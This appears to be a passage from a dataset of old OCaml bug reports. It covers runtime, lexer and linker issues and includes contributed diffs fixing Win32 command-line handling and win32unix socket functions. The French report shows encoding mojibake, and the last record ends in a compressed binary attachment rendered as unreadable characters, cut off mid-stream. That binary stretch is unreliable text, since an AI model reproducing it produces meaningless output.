in\n  let fd_stdout = Unix.descr_of_out_channel stdout in\n  let dup_stdout = Unix.dup fd_stdout in\n\n  Printf.fprintf stderr \"1\\n\"; flush stderr;\n\n  let fd_ochan = Unix.descr_of_out_channel ochan in\n\n  Printf.fprintf stderr \"2\\n\"; flush stderr;\n\n  Unix.dup2 fd_ochan fd_stdout;\n\n  Printf.fprintf stderr \"3\\n\"; flush stderr;\n\n  (* following line yields 'Fatal error: exception Sys_error(\"Bad file\ndescriptor\")' *)\n  Printf.fprintf stdout \"Hello world!\";\nend ;;\n\nmain();;\n"},{"labels":["bug"],"text":"**Original bug ID:** 1507\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nquand l'on tÃ©lÃ©chrage intÃ©gralement \"http://pauillac.inria.fr/ocaml/htmlman/\", logiciel WebDevil sous MAC OS 9,\nj'ai les messages d'erreur suivants :\n\n404 - Not Found http://pauillac.inria.fr/ocaml/htmlman/libref/.html\n404 - Not Found http://pauillac.inria.fr/ocaml/htmlman/libref/\"Pervasives.html#VAL(>\n404 - Not Found http://pauillac.inria.fr/ocaml/htmlman/libref/\"Pervasives.html#VAL(<>\n404 - Not Found http://pauillac.inria.fr/ocaml/htmlman/libref/\"Num.html#VAL(<>\n404 - Not Found http://pauillac.inria.fr/ocaml/htmlman/libref/\"Num.html#VAL(>\n\nMerci d'avance.\n\n----\nla libertÃ© d'expression ne s'use que si on ne s'en sert pas !\n"},{"labels":["bug"],"text":"**Original bug ID:** 1506\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Ker Lutyn\nVersion: OCaml 3.06\nOS: FreeBSD\nSubmission from: 216-239-45-4.google.com (216.239.45.4)\n\n\nlet bin_literal =\n  '0' ['b' 'B'] ['0'-'1'] ['0'-'1']*\nlet float_literal =\n  ['0'-'9'] ['0'-'9' '_']* \n  ('.' ['0'-'9' '_']* )?\n  (['e' 'E'] ['+' '-']? ['0'-'9']+)?\n\nThese are missing the '_' syntax (float_literal is missing it in the exponent). \nIt would be particularly handy for bin_literal, which can be quite long in\npractice.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1502\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nNext small example produce segfault for native code, but work ok in byte\ncode.\n\nI use OCaml 3.06. I compile and run this example on Linux, Win98, and Cygwin\nsystems, result is same.\n\n\ntype s = { mutable exc : exn };;\n        \nlet run max = begin\n    let rec loop n acc = \n      if n > 0\n      then\n        let s = { exc = Not_found } in\n        let f () =\n          s.exc <- Failure (string_of_int n);\n          raise Not_found\n        in\n        loop ( n - 1 ) ( (s, f) :: acc )\n      else acc in\n    print_endline \"Make list\"; flush_all ();\n    let lst = loop max [] in\n    print_endline \"Iter 1\"; flush_all ();\n    List.iter \n      (fun (s,f) -> try f () with Not_found -> ()  ) \n      lst;\n    print_endline \"Iter 2\"; flush_all ();\n    List.iter \n      (fun (s,_) -> ignore(Printexc.to_string s.exc) ) \n      lst;\n    print_endline \"The End\"; flush_all ()\n    end;;\n        \nlet _ = run 3000 ;;\n\n\n-- \nBest Regards,\nArtem Prisyanuk\ntema@sit.kiev.ua\n"},{"labels":["bug"],"text":"**Original bug ID:** 1501\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Eric C. Cooper\nVersion: 3.06\nOS: Debian GNU/Linux\nSubmission from: 12-227-110-111.client.attbi.com (12.227.110.111)\n\n\nType abbreviation for a *printf format type like the following doesn't work.\n  type my_format = (int -> unit, out_channel, unit) format\n  let fmt : my_format = \"The answer is %d.\\n\" in Printf.printf fmt 42\n"},{"labels":["bug"],"text":"**Original bug ID:** 1500\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nI try compile ocaml 3.06 from source on my Windows98 platform (msvc6 +\ncygwin), but make exit with error when comile tcl/tk caml libraies. I\nlook to source code and found what in byterun/winr2.c, function\nwin32_system:\n\n1) suppose max command line length is 4000, I don't know about NT or XP\nwindows, but in win <= 98, max command line is 1024;\n2) not properly handle key \"/nologo\" for cl.exe and link.exe, /nologo\nmust present directly in command line, not in @-file;\n3) not properly handle quoted string for long command line. For ex.:\n    cl.exe arg1 arg2 arg3 arg4 \"subarg1 subarg2 subargr3\" ..... \n   translate to\n\n\targ1\n\targ2\n\targ3\n\targ4\n\t\"subarg1\n\tsubarg2\n\tsubarg3\"\n\n  but right way, do it:\n\n\targ1\n\targ2\n\targ3\n\targ4\n\tsubarg1 subarg2 subarg3\n\n  it's very important for argument passed to linker.\n\nI also think what good idea is separate win32_system function, to two\nfunction. One for internal use to call linker and compiler, they work properly\nwith '@file' in command line, and second for external use in application,\nif user call it function with command line > 1024, exception will be\nraised, for example Invalid_argument \"system: line too long\". Now if\nuser call system with long command line it's has unexpected and\nundocumented behaviour.\n\nNext trouble I found in asmcomp/asmlink.ml and /bytecomp/bytelink.ml,\nfiles. Args passed from cl.exe to link.exe, must be in end line after\nother args passed to cl.exe. It's not important for gcc, but for MS cl.exe\nit's important.\n\nBest regards\nArtem Prisyaznuk\ntema@sit.kiev.ua\n\n----------------\ndiff -ru ocaml-3.06/asmcomp/asmlink.ml G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/asmcomp/asmlink.ml\n--- ocaml-3.06/asmcomp/asmlink.ml\tMon Jul 22 08:07:26 2002\n+++ G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/asmcomp/asmlink.ml\tThu Dec 12 11:13:08 2002\n@@ -248,7 +248,27 @@\n             (Ccomp.quote_files (List.rev file_list))\n     | \"msvc\" ->\n         if not !Clflags.output_c_object then\n-          Printf.sprintf \"%s /Fe%s %s %s %s %s %s %s %s\"\n+          let link_templ = \"/link\" in\n+          let link_templ_len = String.length link_templ in\n+          let ccopts_link,ccopts_other =\n+            List.partition\n+              (fun s ->\n+              \tif String.length s < link_templ_len then false\n+              \telse\n+                  let substr =\n+                    String.lowercase (String.sub s 0 link_templ_len) in\n+                  if substr <> link_templ\n+                  then false\n+                  else\n+                    true\n+              ) !Clflags.ccopts in\n+          let ccopts_link' =\n+            List.map\n+              (fun s ->\n+                String.sub s link_templ_len\n+                  (String.length s - link_templ_len)\n+              ) ccopts_link in\n+          Printf.sprintf \"%s /Fe%s %s %s %s %s %s %s %s %s\"\n             !Clflags.c_linker\n             (Filename.quote output_name)\n             (Clflags.std_include_flag \"-I\")\n@@ -258,7 +278,10 @@\n               (List.rev_map Ccomp.expand_libname !Clflags.ccobjs))\n             (Filename.quote runtime_lib)\n             c_lib\n-            (String.concat \" \" (List.rev !Clflags.ccopts))\n+            (String.concat \" \" (List.rev ccopts_other))\n+            (if List.length ccopts_link' = 0\n+            then \"\"\n+            else \"\\\"/link \"^(String.concat \" \" (List.rev ccopts_link'))^\"\\\"\")\n         else\n           Printf.sprintf \"%s /out:%s %s %s\"\n             Config.native_partial_linker\ndiff -ru ocaml-3.06/bytecomp/bytelink.ml G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/bytecomp/bytelink.ml\n--- ocaml-3.06/bytecomp/bytelink.ml\tTue Jul  2 16:13:12 2002\n+++ G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/bytecomp/bytelink.ml\tThu Dec 12 11:13:08 2002\n@@ -442,10 +442,30 @@\n           (Ccomp.quote_files (List.rev !Clflags.ccobjs))\n           Config.bytecomp_c_libraries)\n   | \"msvc\" ->\n+          let link_templ = \"/link\" in\n+          let link_templ_len = String.length link_templ in\n+          let ccopts_link,ccopts_other =\n+            List.partition\n+              (fun s ->\n+              \tif String.length s < link_templ_len then false\n+              \telse\n+                  let substr =\n+                    String.lowercase (String.sub s 0 link_templ_len) in\n+                  if substr <> link_templ\n+                  then false\n+                  else\n+                    true\n+              ) !Clflags.ccopts in\n+          let ccopts_link' =\n+            List.map\n+              (fun s ->\n+                String.sub s link_templ_len\n+                  (String.length s - link_templ_len)\n+              ) ccopts_link in\n       let retcode =\n       Ccomp.command\n        (Printf.sprintf\n-          \"%s /Fe%s %s %s %s %s %s %s\"\n+          \"%s /Fe%s %s %s %s %s %s %s %s\"\n           !Clflags.c_linker\n           (Filename.quote exec_name)\n           (Clflags.std_include_flag \"-I\")\n@@ -454,7 +474,11 @@\n             (List.rev_map Ccomp.expand_libname !Clflags.ccobjs))\n           (Filename.quote (Ccomp.expand_libname \"-lcamlrun\"))\n           Config.bytecomp_c_libraries\n-          (String.concat \" \" (List.rev !Clflags.ccopts))) in\n+          (String.concat \" \" (List.rev ccopts_other))\n+          (if List.length ccopts_link' = 0\n+          then \"\"\n+          else \"\\\"/link \"^(String.concat \" \" (List.rev ccopts_link'))^\"\\\"\")\n+          ) in\n       (* C compiler doesn't clean up after itself.  Note that the .obj\n          file is created in the current working directory. *)\n       remove_file\ndiff -ru ocaml-3.06/byterun/win32.c G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/byterun/win32.c\n--- ocaml-3.06/byterun/win32.c\tWed Jul 24 03:22:38 2002\n+++ G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/byterun/win32.c\tThu Dec 12 11:13:08 2002\n@@ -314,24 +314,39 @@\n   char * tempfile;\n   FILE * fd;\n   int len, i, j, k, retcode;\n+  char its_quote = '\\0';\n+  char cur;\n \n   len = strlen(cmdline);\n-  if (len < 4000) {\n+  if (len < 1024) {\n     return system(cmdline);\n   } else {\n+    char *nologo=\" /nologo\";\n     /* Skip initial blanks, if any */\n     for (i = 0; cmdline[i] != 0 && isspace(cmdline[i]); i++) /*nothing*/;\n     /* Copy command name to buffer, stop at first blank */\n     for (j = 0; cmdline[i] != 0 && ! isspace(cmdline[i]); i++) {\n       if (j < MAX_CMD_LENGTH) cmd[j++] = cmdline[i];\n     }\n+    if (strncmp(cmdline + i ,nologo, strlen (nologo) ) == 0 &&\n+        j + strlen(nologo) < MAX_CMD_LENGTH ) {\n+      sprintf(cmd + j, \"%s\", nologo); \n+      j = j + strlen(nologo);\n+    }\n     /* Save remainder of command line to temp file */\n     strcpy(template, \"cmXXXXXX\");\n     tempfile = mktemp(template);\n     fd = fopen(tempfile, \"w\");\n     if (fd == NULL) return -1;\n-    for (k = i; k < len; k++)\n-      fputc((isspace(cmdline[k]) ? '\\n' : cmdline[k]), fd);\n+    for (k = i; k < len; k++) {\n+      cur = cmdline[k];\n+      if( cur == '\"' || cur =='\\'' )\n+        if( its_quote == '\\0' )\n+          its_quote = cur;\n+        else\n+          its_quote = its_quote == cur ? '\\0' : its_quote;\n+      fputc(((isspace(cur) && !its_quote) ? '\\n' : cur), fd);\n+    }\n     fclose(fd);\n     /* Add \" @tempfile\" to the command line */\n     sprintf(cmd + j, \" @%s\", tempfile);\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1499\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nI look at socket function in win32 unix library and propose make some\nchanges in it\n\n1) otherlibs/win32unix/accept.c - function setsocketopt erase status of\nlast accept call, WSAGetLastError must be called before it.\n\n2) function set_nonblock and clear_nonblock, not implement in current\nversion, but I read MSDN, and fount what win32 socket support\nnonblocking mode. I propose include these function in library.\n\n3) win32 version of select, raise error if call it with empty lists of\nfiles descr, but linux version handle this situation. I propose emulate\nbehaviour of linux version. If select catch empty lists of fd, it call\nwin32 function Sleep, for emulate time-out.\n\n-- \nArtem Prisyznuk\ntema@sit.kiev.ua\n\n\n----------------\ndiff -ru ocaml-3.06/otherlibs/win32unix/accept.c G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/accept.c\n--- ocaml-3.06/otherlibs/win32unix/accept.c\tFri Jun  7 09:49:42 2002\n+++ G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/accept.c\tThu Dec 12 11:13:08 2002\n@@ -29,6 +29,7 @@\n   int oldvalue, oldvaluelen, newvalue, retcode;\n   union sock_addr_union addr;\n   socklen_param_type addr_len;\n+  int err_code = 0;\n \n   oldvaluelen = sizeof(oldvalue);\n   retcode = getsockopt(INVALID_SOCKET, SOL_SOCKET, SO_OPENTYPE,\n@@ -43,13 +44,15 @@\n   enter_blocking_section();\n   snew = accept(sconn, &addr.s_gen, &addr_len);\n   leave_blocking_section();\n+  if( snew == INVALID_SOCKET )\n+    err_code = WSAGetLastError ();\n   if (retcode == 0) {\n     /* Restore initial mode */\n     setsockopt(INVALID_SOCKET, SOL_SOCKET, SO_OPENTYPE, \n                (char *) &oldvalue, oldvaluelen);\n   }\n   if (snew == INVALID_SOCKET) {\n-    win32_maperr(WSAGetLastError());\n+    win32_maperr(err_code);\n     uerror(\"accept\", Nothing);\n   }\n   Begin_roots2 (fd, adr)\ndiff -ru ocaml-3.06/otherlibs/win32unix/connect.c G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/connect.c\n--- ocaml-3.06/otherlibs/win32unix/connect.c\tFri Jun  7 09:49:42 2002\n+++ G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/connect.c\tThu Dec 12 11:13:08 2002\n@@ -36,3 +36,35 @@\n   }\n   return Val_unit;\n }\n+\n+CAMLprim value unix_set_nonblock(socket)\n+     value socket;\n+{\n+  SOCKET s = Socket_val(socket);\n+  int retcode;\n+  int non_block = 1;\n+\n+  retcode = ioctlsocket(s, FIONBIO, &non_block);\n+  if (retcode) {\n+    win32_maperr(WSAGetLastError());\n+    uerror(\"unix_set_nonblock\", Nothing);\n+  }\n+  return Val_unit;\n+}\n+\n+CAMLprim value unix_clear_nonblock(socket)\n+     value socket;\n+{\n+  SOCKET s = Socket_val(socket);\n+  int retcode;\n+  int non_block = 0;\n+  union sock_addr_union addr;\n+  socklen_param_type addr_len;\n+\n+  retcode = ioctlsocket(s, FIONBIO, &non_block);\n+  if (retcode) {\n+    win32_maperr(WSAGetLastError());\n+    uerror(\"unix_clear_nonblock\", Nothing);\n+  }\n+  return Val_unit;\n+}\ndiff -ru ocaml-3.06/otherlibs/win32unix/errmsg.c G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/errmsg.c\n--- ocaml-3.06/otherlibs/win32unix/errmsg.c\tFri Dec  7 13:40:44 2001\n+++ G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/errmsg.c\tThu Dec 12 11:13:08 2002\n@@ -37,6 +37,8 @@\n                     sizeof(buffer),\n                     NULL))\n     return copy_string(buffer);\n-  return copy_string(\"unknown error\");\n+  sprintf(buffer,\"unknown error:%d\",\n+  \terrnum );  \n+  return copy_string(buffer);\n }\n \ndiff -ru ocaml-3.06/otherlibs/win32unix/select.c G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/select.c\n--- ocaml-3.06/otherlibs/win32unix/select.c\tTue Apr 30 15:00:48 2002\n+++ G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/select.c\tThu Dec 12 16:27:04 2002\n@@ -57,31 +57,43 @@\n \n   Begin_roots3 (readfds, writefds, exceptfds)\n   Begin_roots3 (read_list, write_list, except_list)\n-    fdlist_to_fdset(readfds, &read);\n-    fdlist_to_fdset(writefds, &write);\n-    fdlist_to_fdset(exceptfds, &except);\n-    tm = Double_val(timeout);\n-    if (tm < 0.0)\n-      tvp = (struct timeval *) NULL;\n-    else {\n-      tv.tv_sec = (int) tm;\n-      tv.tv_usec = (int) (1e6 * (tm - (int) tm));\n-      tvp = &tv;\n-    }\n-    enter_blocking_section();\n-    retcode = select(FD_SETSIZE, &read, &write, &except, tvp);\n-    leave_blocking_section();\n-    if (retcode == -1) {\n-      win32_maperr(WSAGetLastError());\n-      uerror(\"select\", Nothing);\n-    }\n-    read_list = fdset_to_fdlist(readfds, &read);\n-    write_list = fdset_to_fdlist(writefds, &write);\n-    except_list = fdset_to_fdlist(exceptfds, &except);\n-    res = alloc_small(3, 0);\n-    Field(res, 0) = read_list;\n-    Field(res, 1) = write_list;\n-    Field(res, 2) = except_list;\n+\ttm = Double_val(timeout);\n+  \tif ( ! (readfds == Val_int(0) && writefds == Val_int(0) && \n+\t\t\texceptfds == Val_int(0) ) ) {\n+\t\tfdlist_to_fdset(readfds, &read);\n+\t\tfdlist_to_fdset(writefds, &write);\n+\t\tfdlist_to_fdset(exceptfds, &except);\n+\t\tif (tm < 0.0)\n+\t\t  tvp = (struct timeval *) NULL;\n+\t\telse {\n+\t\t  tv.tv_sec = (int) tm;\n+\t\t  tv.tv_usec = (int) (1e6 * (tm - (int) tm));\n+\t\t  tvp = &tv;\n+\t\t}\n+\t\tenter_blocking_section();\n+\t\tretcode = select(FD_SETSIZE, &read, &write, &except, tvp);\n+\t\tleave_blocking_section();\n+\t\tif (retcode == -1) {\n+\t\t  win32_maperr(WSAGetLastError());\n+\t\t  uerror(\"select\", Nothing);\n+\t\t}\n+\t\tread_list = fdset_to_fdlist(readfds, &read);\n+\t\twrite_list = fdset_to_fdlist(writefds, &write);\n+\t\texcept_list = fdset_to_fdlist(exceptfds, &except);\n+\t} else {\n+\t\tif ( tm > 0.0 ) {\n+\t\t\tenter_blocking_section();\n+\t\t\tSleep( (int)tm * 1000 );\n+\t\t\tleave_blocking_section();\n+\t\t}\n+\t\tread_list = Val_int(0);\n+\t\twrite_list = Val_int(0);\n+\t\texcept_list = Val_int(0);\n+\t}\n+\tres = alloc_small(3, 0);\n+\tField(res, 0) = read_list;\n+\tField(res, 1) = write_list;\n+\tField(res, 2) = except_list;\n   End_roots();\n   End_roots();\n   return res;\ndiff -ru ocaml-3.06/otherlibs/win32unix/unix.ml G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/unix.ml\n--- ocaml-3.06/otherlibs/win32unix/unix.ml\tFri Jul 12 09:47:54 2002\n+++ G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/unix.ml\tThu Dec 12 11:13:08 2002\n@@ -306,8 +306,13 @@\n external dup : file_descr -> file_descr = \"unix_dup\"\n external dup2 : file_descr -> file_descr -> unit = \"unix_dup2\"\n \n+\n+external set_nonblock : file_descr -> unit = \"unix_set_nonblock\"\n+external clear_nonblock : file_descr -> unit = \"unix_clear_nonblock\"\n+(*\n let set_nonblock fd = ()\n let clear_nonblock fd = ()\n+*)\n \n external set_close_on_exec : file_descr -> unit = \"win_set_close_on_exec\"\n external clear_close_on_exec : file_descr -> unit = \"win_clear_close_on_exec\"\ndiff -ru ocaml-3.06/otherlibs/win32unix/unixsupport.c G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/unixsupport.c\n--- ocaml-3.06/otherlibs/win32unix/unixsupport.c\tFri Jun  7 09:49:42 2002\n+++ G:\\cygwin\\home\\tema\\ocaml\\ocaml-3.06/otherlibs/win32unix/unixsupport.c\tThu Dec 12 11:13:08 2002\n@@ -76,6 +76,8 @@\n /* Mapping of Windows error codes to POSIX error codes */\n \n struct error_entry { unsigned long win_code; int range; int posix_code; };\n+#define EWOULDBLOCK             -WSAEWOULDBLOCK\n+#define EINPROGRESS             -WSAEINPROGRESS\n \n static struct error_entry win_error_table[] = {\n   { ERROR_INVALID_FUNCTION, 0, EINVAL},\n@@ -142,6 +144,8 @@\n #ifdef WSAENFILE\n   { WSAENFILE, 0, ENFILE },\n #endif\n+  { WSAEWOULDBLOCK, 0, EWOULDBLOCK},\n+  { WSAEINPROGRESS, 0, EINPROGRESS},\n   { WSAENOTEMPTY, 0, ENOTEMPTY },\n   { 0, -1, 0 }\n };\n@@ -164,8 +168,6 @@\n \n /* Windows socket errors */\n \n-#define EWOULDBLOCK             -WSAEWOULDBLOCK\n-#define EINPROGRESS             -WSAEINPROGRESS\n #define EALREADY                -WSAEALREADY\n #define ENOTSOCK                -WSAENOTSOCK\n #define EDESTADDRREQ            -WSAEDESTADDRREQ\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1498\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nOCAML VERSION : 3.04\nSYSTEM : Linux Debian\nARCHITECTURE : Bi-Xeon\n\nI don't succeed in compiling this program using camlopt.\n\nyou will find attached the source code of the programs.\n I also include the instructions of compilation\n\n\nBest regards\n\n-- \nFranck Delaplace @w3:http://www.lami.univ-evry.fr/~delapla/\nEquipe BioInfo, La.M.I-U.M.R 8042 C.N.R.S\n523 Place des Terrasses \n91025 Evry CEDEX (France)               \n\n\n\n\n\n\n\n----------------\n\u001fâ¹\b\bÃµ,Ã¿=\u0000\u0003problem.tar\u0000Ã¬Ã½Ã¡Â®,ÃuÂ§wÃªÂ«t\u0015Ã§[SÂ¶ÃÂ©ÃÃËÅ?F\u0003hZrÂ£?QÃ?Â»\u0007\u0018\u0018ÆÃ+Ã±U7\u0001Å \u0014Ãâr\u001bÃ®Â¾ÃÃ±]LÃ&y*Ã·ÃÃÃÃ§ÃÂµR\u0003cF0Â¬Ã&+v?XâÂ±Ã¢Å¸Â¿ÃYÃ¿Ã¸Ã_Ã¼Ã­ÃÂ¾Ã¿â¡Ã¿Ã\u001fÃÃ¸??ÃÃ¶Ãk?Ã¿Ã»Ã±XÃÃ¶Ã¶Â¿âÂ¶Â¾Ã½Ã¯ÃÃ¾Ã\u001fÃÃ¿ÃÂ¾Â·Âµâ¢ÂµÃ½Ãcâ¢Ã¿Â­Ã½\u000fÂ¾Ã;ÃÃÃ¯Ã¾Ã§ÃÂ¿ÃºÃ¡Â»_~Ã¹Ã²\u0007?Ã¹Ã¾gÃÃ½Ã£ÃÂ¾;Ã½Ã¯Ã½Ã­OÃ±ÃÅ¸Ã¿Ã½/Ã¾%ÃÃÂ¿Ã¤Ã¿Ã¼Ã£oÃ«Ã¿\u000fÂ¿Ë\u0013Ã°Ã£Ã¸Ã\u001dÂ¿Ã£Â±<\u001emÃÃÃªÂ¿ÃR~WÃ¿ÃÃ2Ã¿Ã»ÃÃ¼Ã©\u001f|yÃÃ±f>Ã¾ÃÃ¿?ÃÃ¿?fÃ¡Ã½Â³Ã¯Â¿Ã¼Ã°Â¿Ã¾Ã£Ã·_Â¾Ã¼OÃ¿Ã¶Ã|Ã¹Ã²Ã§_Ã¾Ã¨W?Ã½?Ã´Ã¥7?Ã»Ã¡ÃÃ¼Ã½Ãw?Ã»Ã²Ã³_Ã¿Ã¬g_Â¾Ã¼Ã©Ã¼ÃÃ»Ã¿Ã¹ÃÃ³Ã¥Ã»Â¹âÂ¾Ã¿Ã¹\u000f_~Ã¾Ã½Â¯Ã¸Ã¥Ã·_Ã¾Ã±\u0017Â¿Ã¾Ã¥â_Ã¼Ã£Ã·Â¿Ã¼Ã²ÃÃ¼Ã±o_Ã¼Ã¶=_Ã»'Ã¿âÃÃ½Ã¿~Ã·Ã¢Ã§Ã´Ã\u000f?Ã½ÃÃÂ¿|Ã¹Ã®WÂ¿ÃºÃÃÃ½tÃ¾\u001fÃ¿Ã´Ã½âÃ¯Ã¸Ã²âÅ¸Ã¾Ãªâ¡_Ã¾Ã´oÃ½Ã¶Ã¿Ãªwc>\u0007Ã½Ã¾Ã§?Ã¹Â³?Ã»Â£?ÃºÃâºÃ¿âºÃ¯Â¿Ã»ÃÅ¸Ã¾Ã¨Ã¹Ã¦Ã¿âÅ¸Ã¾Ã°Å¸~Ã·Â¾Ã¿Ã¼ÃÃÃ¿Ã¬\u0017ÃÃ½Ã°ÃÂ¿Ã¹\u0017Ã½Ã°Ã_Ã¿Ã\u000fÂ¯ÃoÃ¿Ã?Å¡?Ã¹ÃÃ¼UoÃ¿Â¸?Ã¿Ã²Ã¸Ã±Ã£Â·?xÃ»UÃ}Ã¹ÃÃ¹ÃÃ¹Â¾Â¾|Ã¹o<Ã¿Ã_Å¾Â¿Ã¸ÃÃ±7Ã¹wÃÃ½Ã°ÃÃ½Ã¦Å¸Ã¾Ã¼7Â¿Ã·Å¸Ã»ÃÃ³?Ã»Ã°[Ã¿â¢ÃÃ¹Ã¼â¢_Ã¾Ã¶ÃµÃ»Ã¦DÃÂ¢Ã¼Ã¼Â»\u001f~Ã½Â»\tÃ¾ÃÂ¿ÃºÃ¾?Ã¿Ã£w?Ã¿ÃsÃ¦Â¾Ã¿Ã¹â\u001fÂ¾Ã»?sâÃ¿Ã¢?Ã¼âºÂ¿Ã¾Â«Ã·Ã¯Ã¿ÃªÃÃ¿Ã­_Ã½ÃÃ¿ÃÃ¿ÃÃ½\u0017Ã¿ÃºÃÃÃ¿Ã£/Ã¿ÃâÃ¿71Ã¿_ÃÃ¿Ã¬9oÃ¯Ã¥_}Ã·Ã¥mâÅ¸Ã¼Â¿Å¾Ã¯ÃªÃ=ÃÃÃ¹Ã²âÃÃ½Ã°Ãâ_Ã¼Ã½Ã³?Ã¼Â£/Â¿Ã»WÃ¾ÃÃ³ÃÃ»Ã³Â¿Ã¿ÃµÃÃ¿Ã®â¡_Ã¼Ã²GÃ½Â§Ã³_Ã¼ÃÂ³Å Â¿Ã½Ã}Ã¹Ã?Ã¯Ã»Å¸Ã¿ÃÃ`Ã¿Ã?Ã¼Ãºâ¡Ã¯Ã¦Â¾Ã²Ã¥ÃÃ»Â§Ã³Å¸Ã»Ã¥Â¿Ã¾Ã¶_8Ã¿Ã³Ã§:Ã¼Ã§?ÃºâÃ¥?Â¿Ã¾Ã¼Ã¯ÃºÅ¸Ã§Ã¿Ã¾Ã¹Ã¼ÃÃ¦Ã£ÃÂ¿Ã¾Ã/Ã¿Ã§?Ã¹Ã²Â£Ã¹ÆÃ¹ÃÃ¹Â£?Ã¼Ã/_Å½ÃÃ·Â£Â¿Ã¾Ã±\u000f_Â¾Ã»Ã¥/Â¿Ã»_Ã¿Ã¸ÃµÃ¾Ã¿Ã¨\u000fÃâÃÃ»y}Ã¾â^Ã¿ÃoÃ¾Â£Ã¸Ã®\u001fÃ§<Ã¹Â§Ã¥Ã?Â­ÃuÃ±âºeÃ¸Ã¼OÅ¾Ã¯Ã¬/Å¾ÃÃ¾Ã¸Ã¯~Ã¹Ã½w?ÃÃÃ¾Ã¨7oÃ¦Â¿?oÃ´Â¯Ã¼6Ã¦OÃ¾Ã¥Ã¯Ã±Ã/?Ã½Ã³Ãâ\u001f~Ã±Â»Ã·Ãºâ_Ã5Ã¾Ã£\u001fÃ½Ã´?Å¸Ã¯zÅ½=\u0007Ã»Â¿Ã¦oxÃ»Ã?Ã¹ÃÃÂ¿Ã¿Ã²g_Ã¾Ã©?Å½oÃ±Â­ÃÃ¿Â°|Ã¹â¡Â¯Ã¯Ã¢\u001fÂ¾Ã»Ã¡Ã¯Ã¾ÃÃ¼Ã7Ã´Â¶Ë~Ã»ÃÃ¾ÃÃ³Å¸Ã±Ã¼Ã¡ÅÃ¯XÃ·ÃÃ¹Ã{Â«ÃÃ³â¡ÃÃ¯~Ã¸VÂ¼Ã¹Å¸Ã¼Ã¦Â¿Â½Ã¢Ã­Ã¿Ã¹Â£Ã§Â¿ÃºÂ¯Ã¼Ãº?Ã¼â¡oKÃ¹XÃ¡Â¿Ã»Ã¡ÃerÂ¸Â²Å¾Ã«Ã¸Â·+Ã GÃÃ¿Ã»?Ã§âÃ¼Ãº_ËÃ«Ã¿ÃÃ±Â¿0Ã¿Ã¯Ã§Ã¾\u001cÃ¼mÃÂ¾ÃÃ¨ÃÂ¢Ã½ÃµÃÃ§Â¿Ã¾Ã¯~Ã¸Ã¾Ão{ÃÃ_rÂ¶Â¼Â¾|Ã¹Ãºâ \u000e+Ã Â¹\u0000~WÃ¹Â¯â¦=ÃÃ¼\u000fÂ¿ÃÃÃÃ¿Ã 